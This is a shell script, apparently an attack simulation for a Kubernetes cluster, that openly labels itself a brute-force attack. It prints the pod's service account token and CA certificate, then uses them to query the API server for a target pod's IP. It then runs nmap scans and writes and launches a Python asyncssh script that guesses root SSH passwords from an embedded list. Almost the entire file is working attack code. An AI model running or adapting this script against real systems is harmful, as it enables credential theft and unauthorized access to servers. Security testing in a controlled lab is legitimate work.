#!/bin/sh
set -e 

echo "[start] brute-force attack started"

find /run/secrets -name "*kubernetes*" 2>/dev/null

ls -al /run/secrets/kubernetes.io/serviceaccount/

cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}

export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt

MALICIOUS_IP=""
for i in $(seq 1 20); do
    PODS_JSON=$(curl -s --max-time 5 --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" https://$APISERVER/api/v1/namespaces/$NAMESPACE/pods/)

    PHASE=$(echo "$PODS_JSON" | grep -A 300 '"name": "malicious"' | grep '"phase"' | head -1 | sed 's/.*"phase": "\([^"]*\)".*/\1/')
    POD_IP=$(echo "$PODS_JSON" | grep -A 300 '"name": "malicious"' | grep '"podIP"' | grep -v 'podIPs' | head -1 | sed 's/.*"podIP": "\([^"]*\)".*/\1/')

    echo "[*] Attempt $i: phase=$PHASE, ip=$POD_IP"

    if [ "$PHASE" = "Running" ] && [ -n "$POD_IP" ]; then
        MALICIOUS_IP=$POD_IP
        break
    fi

    sleep 3
done

apt update

apt install nmap python3 -y

hostname -I

nmap -sn 172.16.200.0/24

if [ -z "$MALICIOUS_IP" ]; then
    echo "[ERROR] Could not find target pod IP"
    exit 1
fi

nmap -sT $MALICIOUS_IP

cat << 'eof' > brute_force.py
import warnings
warnings.filterwarnings('ignore', 'Blowfish has been deprecated')
warnings.filterwarnings('ignore', 'CAST5 has been deprecated') 
warnings.filterwarnings('ignore', 'SEED has been deprecated')
warnings.simplefilter('ignore', DeprecationWarning)

import asyncio
import asyncssh
import sys
import logging

async def try_ssh_connection(host, username, password):
    try:
        await asyncio.sleep(0.5)
        async with asyncssh.connect(
            host, 
            username=username,
            password=password,
            known_hosts=None
        ) as conn:
            print(f'Success: {password}')
            return password
    except asyncssh.PermissionDenied:
        print(f"Permission denied with password: {password}")
    except asyncssh.ConnectionLost:
        print(f"Connection lost while trying password: {password}")
    except Exception as e:
        print(f"fail: {str(e)}, pwd: {password}")     
        return None

async def connection_worker(host, passwords, batch_size=10):
    tasks = []
    successful_passwords = []
    
    for i in range(0, len(passwords), batch_size):
        batch = passwords[i:i + batch_size]
        batch_tasks = [
            try_ssh_connection(host, 'root', password)
            for password in batch
        ]
        
        results = await asyncio.gather(*batch_tasks, return_exceptions=True)
        successful = [r for r in results if r is not None]
        successful_passwords.extend(successful)
        
        if successful_passwords:  # 성공한 비밀번호를 찾으면 즉시 반환
            return successful_passwords
            
    return successful_passwords

async def main(host, passwordList, max_concurrent=10):
    try:
        results = await connection_worker(host, passwordList, max_concurrent)
        return results
    except Exception as e:
        print(f"Main error: {e}")
        return []

if __name__ == '__main__':
    host = sys.argv[1]
    
    try:
        with open('passwordList.txt') as f:
            passwordList = [line.strip() for line in f.readlines()]
        
        results = asyncio.run(main(host, passwordList, max_concurrent=10))
        
        if results:
            print("\nSuccessful passwords found:")
            for password in results:
                print(password)
    except Exception as e:
        print(f"Error: {e}")
eof

apt install python3-asyncssh -y

cat << 'eof' > passwordList.txt
rt45w
nk52
j4k2p
85mt3
p9x4n
7kj3m
w3tp
qrs52n
n5p2k
x4j2m
ht56p
m7n3v
k8w4d
3npx5
qt7m
v6k8n
p2x4t
84wkm
j5n2v
tkp63
mn45w
h2k9p
w7t3n
5jk8m
qx4p2
n8v3t
k5w2j
p6m4n
x3t8k
w4j2p
v5n7m
h8k3t
q2x6w
m4p7n
j3k8t
w6v2m
n9p4k
x7t2j
k4m8n
p5w3v
h6t9k
q8x4m
j7n2p
w3k6t
m5v8n
p2x7k
t4j9m
k8w3v
n6p5t
x2m7k
h4v8j
q9t3p
w5n6m
k7x4t
p3j8v
m2w5n
t6k9x
v4p7j
n8m3w
h5t2k
q7x9p
j3v6m
w8n4t
k2p5x
1234
m6j7v
n4w3t
p9k8x
t5m2j
v7h6n
w3x4k
q8p9m
j2t5v
k6n7w
h4x3p
m8t2j
v5w6n
p7k4x
t3m9q
n2h8v
w6j4k
x5p7t
m4n3w
k8v2h
q9t6x
j7p4m
w2n5v
h3k8t
p6x9m
n4j7w
v5t2k
m8h6x
q3p9n
w7j4v
k2t5m
x8n3h
t6p7w
j4v2k
m9x5n
eof

python3 brute_force.py $MALICIOUS_IP

echo "[done] brute-force attack completed"